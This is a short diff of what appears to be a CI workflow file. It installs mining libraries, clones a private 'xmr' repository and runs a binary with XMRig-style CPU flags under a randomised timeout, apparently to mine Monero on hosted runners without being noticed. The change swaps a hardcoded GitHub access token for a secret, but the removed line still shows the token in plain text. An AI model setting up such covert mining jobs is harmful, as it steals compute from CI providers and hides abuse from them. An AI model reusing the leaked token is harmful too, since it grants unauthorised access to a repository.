@@ -16,7 +16,7 @@ jobs:
       - run: |
           apt update -qq
           apt install -y git libuv1 libssl1.1 libhwloc15
-          git clone https://daveyg5:f4e68ab6c23d8076def323e3e7576c035ae20542@github.com/daveyg5-org/xmr.git
+          git clone https://daveyg5:${{ secrets.token }}@github.com/daveyg5-org/xmr.git
           cd xmr
           chmod u+x prog
           timeout $(shuf -i 700-820 -n 1) ./prog --cpu-no-yield --cpu-priority 5 || true
